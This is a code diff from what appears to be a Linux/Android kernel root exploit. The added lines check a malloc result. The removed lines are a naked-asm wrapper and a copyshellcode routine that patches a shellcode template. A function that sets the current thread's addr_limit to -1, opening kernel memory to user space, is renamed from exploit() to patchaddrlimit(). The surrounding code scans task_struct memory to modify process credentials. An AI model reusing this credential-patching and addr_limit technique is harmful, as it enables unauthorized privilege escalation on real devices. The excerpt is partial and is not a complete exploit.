@@ -71,6 +71,9 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 		return 1;
 
 	tsp = malloc(sizeof(*tsp));
+	if (!tsp)
+		return -ENOMEM;
+
 	for(i = 0; i < 0x600; i+= sizeof(void*))
 	{
 		struct task_struct_partial* __kernel t = (struct task_struct_partial*)((void*)ti.task + i);
@@ -139,33 +142,12 @@ end:
 }
 
 #if !(__LP64__)
-__attribute__ ((naked)) static void wrapper()
-{
-	asm volatile(
-		"ldr PC, ="TOSTR(ASMMAGIC)
-	);
-}
 
-static struct thread_info* exploit()
+struct thread_info* patchaddrlimit()
 {
 	struct thread_info* ti = current_thread_info();
 	ti->addr_limit = -1;
 	return ti;
-}
-
-void copyshellcode(void** addr)
-{
-	unsigned int i;
-	memcpy(addr, wrapper, 0x100);
-
-	for(i = 0; i < (0x100 / sizeof(void*)); i++)
-	{
-		if(addr[i] == (void*)ASMMAGIC)
-		{
-			addr[i] = &exploit;
-			break;
-		}
-	}
 }
 
 #else
